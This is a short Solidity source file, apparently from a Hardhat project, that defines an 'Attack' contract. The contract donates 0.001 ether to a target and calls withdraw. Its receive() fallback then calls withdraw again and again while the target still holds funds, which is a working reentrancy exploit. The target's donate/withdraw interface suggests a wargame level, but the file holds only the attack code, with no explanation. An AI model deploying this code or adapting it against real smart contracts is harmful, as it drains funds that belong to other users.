// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "hardhat/console.sol";

contract Attack {
    uint256 amount = 0.001 ether;

    function attack(address _to) external payable {
        require(msg.value == 0.001 ether, "Need to be exact 0.001");

        // donate first
        _to.call{value: amount}(
            abi.encodeWithSignature("donate(address)", address(this))
        );

        // withdraw
        _to.call(abi.encodeWithSignature("withdraw(uint256)", amount));
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            msg.sender.call(
                abi.encodeWithSignature("withdraw(uint256)", amount)
            );
        }
    }
}
